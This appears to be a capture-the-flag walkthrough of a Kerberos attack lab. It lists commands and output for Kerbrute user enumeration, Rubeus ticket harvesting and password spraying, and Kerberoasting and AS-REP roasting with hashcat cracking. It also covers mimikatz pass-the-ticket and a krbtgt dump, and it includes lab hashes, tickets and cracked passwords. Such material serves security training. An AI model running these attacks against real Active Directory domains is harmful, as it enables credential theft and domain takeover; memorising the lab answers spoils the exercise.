@@ -1,0 +1,411 @@
+Task 2 Enumeration w/ Kerbrute 
+
+echo '10.10.6.177  CONTROLLER.local' /etc/hosts
+
+Download https://github.com/ropnop/kerbrute/releases
+
+Wordlist User.txt download https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt
+
+./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local /usr/share/wordlists/AD/User.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 07/30/21 - Ronnie Flathers @ropnop
+
+2021/07/30 22:21:38 >  Using KDC(s):
+2021/07/30 22:21:38 >   CONTROLLER.local:88
+
+2021/07/30 22:21:39 >  [+] VALID USERNAME:       administrator@CONTROLLER.local
+2021/07/30 22:21:39 >  [+] VALID USERNAME:       admin2@CONTROLLER.local
+2021/07/30 22:21:39 >  [+] VALID USERNAME:       admin1@CONTROLLER.local
+2021/07/30 22:21:42 >  [+] VALID USERNAME:       httpservice@CONTROLLER.local
+2021/07/30 22:21:42 >  [+] VALID USERNAME:       sqlservice@CONTROLLER.local
+2021/07/30 22:21:42 >  [+] VALID USERNAME:       machine2@CONTROLLER.local
+2021/07/30 22:21:42 >  [+] VALID USERNAME:       machine1@CONTROLLER.local
+2021/07/30 22:21:42 >  [+] VALID USERNAME:       user1@CONTROLLER.local
+2021/07/30 22:21:43 >  [+] VALID USERNAME:       user3@CONTROLLER.local
+2021/07/30 22:21:43 >  [+] VALID USERNAME:       user2@CONTROLLER.local
+
+
+- How many total users do we enumerate?
+10
+
+
+- What is the SQL service account name?
+sqlservice
+
+
+- What is the second "machine" account name?
+machine2
+
+
+- What is the third "user" account name?
+user3
+
+
+#Task 3 Harvesting & Brute-Forcing Tickets w/ Rubeus 
+ssh Administrator@10.10.6.177
+Harvesting Tickets w/ Rubeus - 
+controller\administrator@CONTROLLER-1 C:\Users\Administrator>powershell
+PS C:\Users\Administrator>cd Downloads
+PS C:\Users\Administrator\Downloads> .\Rubeus.exe harvest /interval:30
+
+ ______        _                       
+  (_____ \      | |                      
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[*] Action: TGT Harvesting (with auto-renewal) 
+[*] Monitoring every 30 seconds for new TGTs
+[*] Displaying the working TGT cache every 30 seconds
+
+
+[*] Refreshing TGT ticket cache (7/30/2021 8:37:56 AM)
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
+  StartTime             :  7/30/2021 8:09:42 AM
+  EndTime               :  7/30/2021 6:09:42 PM
+  RenewTill             :  8/6/2021 8:09:42 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
+    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEuWCZtGVmHriRf7err8L70AkfLHfVah5DA0l
+    RKBd4XcRhCTt+Dy9ZZpm+0tXlNxIR3Scx7UWRjgOL507L6GhYF6ZYQgI/uws74tyz9eaEWZUaMvUYDP23LZbFY7sP2q7EuFxPg5/
+    ik90sJxPYaxd0ga30GOWv1qXD9SzbHCTNPvZuOVTCaSsH76xNqPRH+I0ueVIBgSYfAS+gwOI7m5fNVVBlFBYUumx0wUpWMlFmQnN
+    7Hdyvj5iX7amkmycMNMLaAoQby1DbhQxyj/3+vc/wXbJxVBE1ZcHrhRVMK+ECW4PFeVCutzQYhJlKYmAC3hhzwXVieOeMYx0AyZj
+    ZIPNwDbfFN9I0CFhf01RAhXsaqA8b2pCqIQWPZgK1wfbnApwHCfMUeTuPPpQIa9dbLV4cTtIlzgmYfub0zJYbzUQQyRw4LpCwN2H
+    ECVxlD3piaZN92CqBCBSVd4dRZUCly1qkcd0ZvuplkgWLdXTdjNzN60MGR3EB/gU5fvG7M+ZawjPJetVixhYisllOH1AY6+XDQ5S
+    f6tcUI+BSvdAgRWZJXOgMLLWieQ0V4VTXXnOQmSWDuWSxweuMInGXjldJXbZ6uSlYBoWOXqsFff07hbZhkaekCjBWy0RebPcgr5W
+    02yJgD++UZi+QqPP/Tzrk0Hu/LT9uJ+6w7EUePWvh3V/SvyNZl7azLUZY0Yr7X9IJ2bR/ftRkU7PGVGbESBmAeZkmU1dCrpqZASq
+    FsEOB85GGo9afSJjkOBzAwRMQHNVFEvv3rG156RwSz0UCHnHm35BFiRvkLE/9syieaO17O/DNTrwsXVNEwrYw01F7TMuoUndZxXU
+    oQX4ITbH13YHqBW1rlfOqsmpOVq5ZnEQM5pOLjkEXVPYykToLgjlxBTPCcqqtpsl5UafnjxQTu1xvnUUowfQzMacIKjgTgQ0cDW5
+    8r6WTTgH5CQH+9pTy00Jytga791oSvG7rU3jsW4iR9j8zqwFp+KIeRjDWVYG+r/jqWF5+CUAW0RsXzJKCrzJc1iLZT9tyUXXU/kW
+    jj2iRY47tyaeSOcTDJd9UjlsQVhbEVFyO89noJ2bwUq405ASB8/DZ3MbyDY4Ze0C1E/RjgUccIjIFb1pMZ3trAWVwL4OGNKVvtpu
+    94JiWpq9m9QvWrMIG5acVhJAAHF6CnxBchticbfzVjNZkwmm+Nak8Ofb4m4iQb5M/8/qykWVM1bxIZxKMOJKuptr+IGoNSg8Lu91
+    4uApyxi9wg20YG5QBkuJqPVThUy1PaGCfc6ErPKN/F05c737MnTx4nf5zSmSUfR6Hw1XYDg5df+QhTGUIrEpQRJe39qnMD8O0EEx
+    AE8kpDADNjij9410YVWyPEg3Fsh3taF4d/XoSF2L+FYLkp5TRwpWNrijgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
+    MCmgAwIBEqEiBCDl/nnbgwNym0HZRqncPzycfVSpFp7Bf5hcZrnVSOvm76ESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
+    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIxMDczMDE1MDk0MlqmERgPMjAyMTA3MzEwMTA5NDJapxEYDzIwMjEwODA2
+    MTUwOTQyWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
+
+  User                  :  Administrator@CONTROLLER.LOCAL
+  StartTime             :  7/30/2021 8:33:21 AM
+  EndTime               :  7/30/2021 6:33:21 PM
+  RenewTill             :  8/6/2021 8:33:21 AM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+
+    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
+
+Brute-Forcing / Password-Spraying w/ Rubeus -
+PS C:\Users\Administrator\Downloads> Set-Content C:\Windows\System32\drivers\etc\hosts "10.10.6.177 CONTROLLER.local" 
+PS C:\Users\Administrator\Downloads> .\Rubeus.exe brute /password:Password1 /noticket
+
+- Which domain admin do we get a ticket for when harvesting tickets?
+Administrator
+
+- Which domain controller do we get a ticket for when harvesting tickets?
+Controller-1
+
+
+#Task 4 Kerberoasting w/ Rubeus & Impacket 
+Method 1 - Rubeus
+PS C:\Users\Administrator\Downloads> .\Rubeus.exe kerberoast
+hashcat -m 13100 -a 0 hash.txt Pass.txt
+With Pass.txt download from https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt
+
+Method 2 - Impacket
+Impacket Installation - 
+Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20
+1.) cd /opt navigate to your preferred directory to save tools in 
+2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
+3.) cd Impacket-0.9.19 navigate to the impacket directory
+4.) pip install . - this will install all needed dependencies
+
+Kerberoasting w/ Impacket - 
+locate GetUserSPNs.py
+GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.6.177 -request
+Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation
+
+ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
+-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
+CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-26 05:28:26.922527  2020-05-26 05:46:42.467441             
+CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-26 05:39:17.578393  2020-05-26 05:40:14.671872             
+
+$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$609bea963d9d12268736d231fb8636e1$f8afa6d5f688946b3a6f2c8720acb63c9952fc6af940d0c502a2ec451f2ab9d76023b1126510076baf5ad208996f6812da884049b996c89b0fecc5461d50fc6b42b268b72fac08512a86490e5a6ceafb188ce174dc64ee83bf365d5222cf5a0fc1721cba1fe5df0d19dcfcbf5101e3d7d02c1dde89d3016179025268af77fffc588e1fbcd1f89cd57cd0dc2abf4b241a67f5f64d8e6f68a1a2b984f4c5dadc97c67e9363e8ba80c4161dba0b24d8251189b921b904c8be6a0e9ea4a881ac2ed80857ffafbd6fa0029b2604b6392410dfa74deb04d8d63f9d7853fa0673bc92576d577afa82473b277e56a5d3452cda297cdc26cff793c161b65dddf8cd8c8c9c2ac5b0ef6a2ba6ddab41f2525dd5d09972f953149cd02314c377b93029a593e84d27fe18f7302ab5ff79373475226a926b7b666d8a876b910d7453b136a26e45ac85b9cd0181446fe4d437df0c6e8cd0cc6617d4a8582b0d2b0a6c1621fcc2be2745a0e3b7e45f695dae85ad0c13b629d1ef6cf1e4b9c0d3df4040a109fc5232c434de1baac86cb4e29348a18d268197021cec4dc9d5832f271099acb8591d3ccc7e0fdb6cbe8d6da9951ddedaaeb481b825b44a9ff4a67698eb5a5621823b32e22f651ec54390220889d64f8195ee4fd79e013bc222cfeef63d523f86a66321961762e7fe53181c5a3196c93c061f4afbc5b1a3c634277507f8c6128022ec032be329be0dba1ee9d7ca295470e7b7b8808ceed26904ebb85bcbf3dec6a1ac9a88bb8eb9e780ccb68476161adc285f98dbca92cccb59fae736f0557e7854398c11d65802f0084e2693d2a78fb5f295a83a7e69d361c7df27cc596ab71f2b860680aefacde0a4aca8f51e8999e5410c9594cdf1884c639ca786b1fd48c52883af02b6ae5b7994d1d64dbc5fee2f6941731b355d035a2808132ee4d83f21c1520effae969a6d9dbecd7691110f2014bfe2b1e1b56665f83a4a7861f2cef99f6c23c3000a1f57486409ee95f00ecda8882878b054e424039e8fa659905f3e04ad727113ae9321100c1c025ac57c820ddeefca50e94b12a932f931601f60c9ea98baa914f68cb6fdccda3b836db894be7038aa2af3c01578ff8cfba4aa9d726ef7891947b14810b63fff4c75b95d0d5141b13e6af17ea49357ba3e0b637e7297a084907c05ec31888c607be6c149f13c341e3c0be6e4d4c4d2d1c77163c63bfa033260ea093dc15b2d61a353391c438a429e2e9353e45a4ba62e27e5ca98f76fbb05c6ba1706c6f0fe4c7f9a05b491bb1d3762d2eb9d7e95b5f9a73fff8db7c60609acc802cff8dc6c38398af4e46d98857653799220cad513120fa45a76548e4452b9b6c74923d41b6271baabd31eedee7a63
+$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$52cc241eb8efcba82580e04ba4509b78$f3e44fc9bd8bf25aa42fbce84e7edfe03be3ac044ac63e5f5ca799a9ec3953a7779886faa6919dc96c1a41a92db57b86db0e0c38849a88a67782a4a20d6af0729684f487e47d6b3adc4f35fe8f99c7ad4bf5bad1935ba1ef0bc82e0a57995e701d2266b9862f36b93f7d0d562d485921541045b92961bc174cc1f882c29c1dfaa3ea8f43140dffabb6f151805f78d418cf320b5ff5c77b48214d2eb3b78eeb84481a253729c9ea36871f70b07b00203ef22c17eab60bfb58bb4e65a947fe2c647df49ffbe00be8a901e43d0d5c7297c76731f4d48ac555f65ac0de49e83ade0b9d4e4fccb18f414dd4fe70be8e78d52f32dddf2e1d49177f3d5becd62e9a911f21fd44b3933307cb8fa5263a2b77910942c4a1a8af84e8bc3fa4524e8850611cf11cbc9f56838383c5b1786ef68b571175a6f5a6acffb645992800084ddbe5b084009c35d8ad1ed90b04d8645d47be2b60507d8b48d9898fe539aad6c135e8da60b8e8baf6750d0e85a6ba4752020e5f8252187aa8120be52ded943212dc874db16f144659c58f0b6042516da56628d555698c87df1bc6b549da802db68f381f307bf1be57614bc3a5fd7e943da8ceb9fb9064122d41ed5423c1a9f41834b37eed431c38f0f9337cc221f97a28386d4cae86f0ad3918fc2b6ce256aaaec7e0d25fb2613ac72dd92e934e573379e49c708f69fc817334a462f3f1c4ccc31bc5e98bdeb534892b7d8880f83359fe8f70856cb570deb0f52b23574e4a29786893d120c959f1c6d1618873b292d8bf5941eaaba79826ed2407beabfa4b9dc584e011b6da85251b503171eeadb3e03cb1421a9d1f57ab25fcd23e86db94d69b7b702fa55cabc75e8e0666ea7fa0c91fefb06864c25d1e437c1c527c4f9c80c71450383a790b5003bd24c44d8ff21acd05db22ef8577d5ed0a07241ca4909e474f1dd4a477224ee8b2f911b604378dcf67f838b24371526d732e7651ff801523ff0914634947faa9d011f0fcdfb14bb96f1683c26f8b933e1688b82fc56858f69bfe8eb24110a0ba7883f917d32afcf92fab601409246ca5d92c3fb2f7cbb2f889fcfa987f36b4f12276de3c2f0230ecaecfe04e249255c13f63027b47006286934240297ce12ce5518b1183ac587187dba5d319ca690312fbcc8b248c0c7f7dde71ffad3a7c80d0542c5f94cf8fc1ab906effdd96fcf72c4519b86071ce8189d6f347a8839325ccaaad611bdf09fd28c5594709b50ee7aec0ce204d488053c4bb18c59621d123287a572509b2ce0ca5bf7a5a2742c8a7ad692c92ba0716880b5eae916171d3fb1b33a4ea383140b7151cc3dd17119f5db4e236231f9daf9e17dbfa1b7d590f67ca772eab83461fccae8ec1d819
+
+
+- What is the HTTPService Password?
+Hint: copy $krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$52cc241eb8efcba82580e04ba4509b78$f3e44fc9bd8bf25aa42fbce84e7edfe03be3ac044ac63e5f5ca799a9ec3953a7779886faa6919dc96c1a41a92db57b86db0e0c38849a88a67782a4a20d6af0729684f487e47d6b3adc4f35fe8f99c7ad4bf5bad1935ba1ef0bc82e0a57995e701d2266b9862f36b93f7d0d562d485921541045b92961bc174cc1f882c29c1dfaa3ea8f43140dffabb6f151805f78d418cf320b5ff5c77b48214d2eb3b78eeb84481a253729c9ea36871f70b07b00203ef22c17eab60bfb58bb4e65a947fe2c647df49ffbe00be8a901e43d0d5c7297c76731f4d48ac555f65ac0de49e83ade0b9d4e4fccb18f414dd4fe70be8e78d52f32dddf2e1d49177f3d5becd62e9a911f21fd44b3933307cb8fa5263a2b77910942c4a1a8af84e8bc3fa4524e8850611cf11cbc9f56838383c5b1786ef68b571175a6f5a6acffb645992800084ddbe5b084009c35d8ad1ed90b04d8645d47be2b60507d8b48d9898fe539aad6c135e8da60b8e8baf6750d0e85a6ba4752020e5f8252187aa8120be52ded943212dc874db16f144659c58f0b6042516da56628d555698c87df1bc6b549da802db68f381f307bf1be57614bc3a5fd7e943da8ceb9fb9064122d41ed5423c1a9f41834b37eed431c38f0f9337cc221f97a28386d4cae86f0ad3918fc2b6ce256aaaec7e0d25fb2613ac72dd92e934e573379e49c708f69fc817334a462f3f1c4ccc31bc5e98bdeb534892b7d8880f83359fe8f70856cb570deb0f52b23574e4a29786893d120c959f1c6d1618873b292d8bf5941eaaba79826ed2407beabfa4b9dc584e011b6da85251b503171eeadb3e03cb1421a9d1f57ab25fcd23e86db94d69b7b702fa55cabc75e8e0666ea7fa0c91fefb06864c25d1e437c1c527c4f9c80c71450383a790b5003bd24c44d8ff21acd05db22ef8577d5ed0a07241ca4909e474f1dd4a477224ee8b2f911b604378dcf67f838b24371526d732e7651ff801523ff0914634947faa9d011f0fcdfb14bb96f1683c26f8b933e1688b82fc56858f69bfe8eb24110a0ba7883f917d32afcf92fab601409246ca5d92c3fb2f7cbb2f889fcfa987f36b4f12276de3c2f0230ecaecfe04e249255c13f63027b47006286934240297ce12ce5518b1183ac587187dba5d319ca690312fbcc8b248c0c7f7dde71ffad3a7c80d0542c5f94cf8fc1ab906effdd96fcf72c4519b86071ce8189d6f347a8839325ccaaad611bdf09fd28c5594709b50ee7aec0ce204d488053c4bb18c59621d123287a572509b2ce0ca5bf7a5a2742c8a7ad692c92ba0716880b5eae916171d3fb1b33a4ea383140b7151cc3dd17119f5db4e236231f9daf9e17dbfa1b7d590f67ca772eab83461fccae8ec1d819
+save file httphash.txt
+
+hashcat -m 13100 -a 0 httphash.txt Pass.txt
+Summer2020
+
+
+- What is the SQLService Password?
+Hint: copy 
+$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$609bea963d9d12268736d231fb8636e1$f8afa6d5f688946b3a6f2c8720acb63c9952fc6af940d0c502a2ec451f2ab9d76023b1126510076baf5ad208996f6812da884049b996c89b0fecc5461d50fc6b42b268b72fac08512a86490e5a6ceafb188ce174dc64ee83bf365d5222cf5a0fc1721cba1fe5df0d19dcfcbf5101e3d7d02c1dde89d3016179025268af77fffc588e1fbcd1f89cd57cd0dc2abf4b241a67f5f64d8e6f68a1a2b984f4c5dadc97c67e9363e8ba80c4161dba0b24d8251189b921b904c8be6a0e9ea4a881ac2ed80857ffafbd6fa0029b2604b6392410dfa74deb04d8d63f9d7853fa0673bc92576d577afa82473b277e56a5d3452cda297cdc26cff793c161b65dddf8cd8c8c9c2ac5b0ef6a2ba6ddab41f2525dd5d09972f953149cd02314c377b93029a593e84d27fe18f7302ab5ff79373475226a926b7b666d8a876b910d7453b136a26e45ac85b9cd0181446fe4d437df0c6e8cd0cc6617d4a8582b0d2b0a6c1621fcc2be2745a0e3b7e45f695dae85ad0c13b629d1ef6cf1e4b9c0d3df4040a109fc5232c434de1baac86cb4e29348a18d268197021cec4dc9d5832f271099acb8591d3ccc7e0fdb6cbe8d6da9951ddedaaeb481b825b44a9ff4a67698eb5a5621823b32e22f651ec54390220889d64f8195ee4fd79e013bc222cfeef63d523f86a66321961762e7fe53181c5a3196c93c061f4afbc5b1a3c634277507f8c6128022ec032be329be0dba1ee9d7ca295470e7b7b8808ceed26904ebb85bcbf3dec6a1ac9a88bb8eb9e780ccb68476161adc285f98dbca92cccb59fae736f0557e7854398c11d65802f0084e2693d2a78fb5f295a83a7e69d361c7df27cc596ab71f2b860680aefacde0a4aca8f51e8999e5410c9594cdf1884c639ca786b1fd48c52883af02b6ae5b7994d1d64dbc5fee2f6941731b355d035a2808132ee4d83f21c1520effae969a6d9dbecd7691110f2014bfe2b1e1b56665f83a4a7861f2cef99f6c23c3000a1f57486409ee95f00ecda8882878b054e424039e8fa659905f3e04ad727113ae9321100c1c025ac57c820ddeefca50e94b12a932f931601f60c9ea98baa914f68cb6fdccda3b836db894be7038aa2af3c01578ff8cfba4aa9d726ef7891947b14810b63fff4c75b95d0d5141b13e6af17ea49357ba3e0b637e7297a084907c05ec31888c607be6c149f13c341e3c0be6e4d4c4d2d1c77163c63bfa033260ea093dc15b2d61a353391c438a429e2e9353e45a4ba62e27e5ca98f76fbb05c6ba1706c6f0fe4c7f9a05b491bb1d3762d2eb9d7e95b5f9a73fff8db7c60609acc802cff8dc6c38398af4e46d98857653799220cad513120fa45a76548e4452b9b6c74923d41b6271baabd31eedee7a63
+save file sqlhash.txt
+hashcat -m 13100 -a 0 sqlhash.txt Pass.txt
+
+MYPassword123#
+
+#Task 5 AS-REP Roasting w/ Rubeus 
+.\Rubeus.exe asreproast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: AS-REP roasting
+
+[*] Target Domain          : CONTROLLER.local 
+
+[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
+[*] SamAccountName         : Admin2 
+[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local 
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::ec82:2772:6469:f1ac%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
+[+] AS-REQ w/o preauth successful! 
+[*] AS-REP hash:
+
+      $krb5asrep$Admin2@CONTROLLER.local:B56FABFB87FCD0640DEF41BCAF1455E6$F037D0AAD53D
+      667A5A00504B826BC117421D4F40E328E829B2E00D086A35E13BA0E2CD2A06103D1DEEE28B331CAF
+      95299CB2F8A9999C68C28C4F40C7D41FE79642F8C15B302158A256944449E50702BA517F558827E0
+      B49F9DCC30D2CB5AFA8C77A22A1B4F095C744FA91DD44A8C23E30200E2A3714C8ABDB4E4FAF8AF87
+      1350D58057AB9458FFD2477BC4DD437A1330A5493D467074FD4E28A695DD69690A6478697CF83476
+      D4F531449D3314F8E37118960F241BB3DD40FC09036609DC0F18F37039E50A1C87778481CDD61197
+      257C9FD39228D3A29C54FBD1C5E8D87A7F5CE51EEB40B4A970C2E5BFA94F9711305F7A9CFE69
+
+[*] SamAccountName         : User3
+[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
+[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::ec82:2772:6469:f1ac%5)
+[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
+[+] AS-REQ w/o preauth successful!
+[*] AS-REP hash:
+
+      $krb5asrep$User3@CONTROLLER.local:F84572F2F93B2EC38B7EC1231249F2AD$CFF45E2337854
+      D66A14C209584CC62CC297BD70C755ABCDF1D105E4906418C7E7960CB26918DA7B7F50DBA6DDF41D
+      C1EE1A7FF21FA375BFCE74F94086B9B7FA4F52C20AC457BAF0930CC22733C78A2BF4673E908A5B86
+      2BD75DEA729237BEED65A21D0A4D3ED1BA64F7EC6AC9AAF12746FC37CCC94CEC6FA8DFD1DCA2DB4E
+      B32BF5C2A931C5B6631B544D25B286D0E6A518E6ADF6BDC471878711F92666F95234849037F86DAA
+      4077047A4C277C3F66E0B27C5FE10F23162F3D4D165F914E1E3F2BBD4758ACAB895858EA96E962C1
+      7C7AA1FC293D0AA12AA5F35AADDBB24330DB39B9DD91C80BB7D0A5977FC5A2D4C96F43A1639
+
+
+
+- What hash type does AS-REP Roasting use?
+hint: 
+hashcat --help | grep "Kerberos"
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols
+  13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols
+  18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols
+  19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols
+  19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols
+  19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols
+  19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols
+
+Kerberos 5, etype 23, AS-REP
+answer right: Kerberos 5 AS-REP etype 23
+
+
+
+- Which User is vulnerable to AS-REP Roasting?
+User3
+
+
+- What is the User's Password?
+hint: hashcat -m 18200 user3hash.txt /usr/share/wordlists/AD/Pass.txt 
+with user3hash.txt is
+$krb5asrep$23$User3@CONTROLLER.local:C62E12D617EA57AE1537F118F3612BD7$4E69C0E77997C6E4956A301E0E69BA5A06F6B8AFA0020300CA3C64E47E501FBD028DCE3BACDE634F87D6A53A8BD9C6901D4113E83FD8F406DD3C8B398C961B55BEE6AE5823B97CC504D6644DF40E98828C4D991BB65ED07089C58FE5043365F65D53C4DB55D4B282B3173A5030B4CDAAC526037E20C13D93B948255FFBBB2F918CA2B3A61228B25AF1F78A7C560F4C135C4FC341B16720705CDFC95B0BC3D64CDAD4131F1815AEDDB99574E0B256B87636EB81FB137E7A7C2B6D7D74FB05F6F4E1C2DB4E915F31C720F88203E74F79CEA152D231EA1935FCC540F659B69A06570473D1CDC2ABC0A645C7AEC45A2B23D28C7B5058
+
+Password3
+
+
+- Which Admin is vulnerable to AS-REP Roasting?
+admin2
+
+
+- What is the Admin's Password?
+hint: hashcat -m 18200 admin2hash /usr/share/wordlists/AD/Pass.txt 
+P@$$W0rd2
+
+#Task 6 Pass the Ticket w/ mimikatz 
+
+Prepare Mimikatz & Dump Tickets - 
+mimikatz#sekurlsa::tickets /export
+
+ticket
+...[0;3d384]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
+
+
+Pass the Ticket w/ Mimikatz
+kerberos::ptt <ticket>
+mimikatz# kerberos::ptt [0;3d384]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi 
+mimikatz # exit
+Bye!
+PS C:\Users\Administrator\Downloads> klist
+
+Current LogonId is 0:0x3d384
+Cached Tickets: (1)
+
+#0>     Client: Administrator @ CONTROLLER.LOCAL
+        Server: krbtgt/CONTROLLER.LOCAL @ CONTROLLER.LOCAL
+        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
+        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
+        Start Time: 7/30/2021 20:01:54 (local)
+        End Time:   7/31/2021 6:01:54 (local)
+        Renew Time: 8/6/2021 20:01:54 (local)
+        Session Key Type: AES-256-CTS-HMAC-SHA1-96
+        Cache Flags: 0x1 -> PRIMARY
+        Kdc Called:
+
+
+
+#Task 7 Golden/Silver Ticket Attacks w/ mimikatz 
+
+Dump the krbtgt hash -
+lsadump::lsa /inject /name:krbtgt
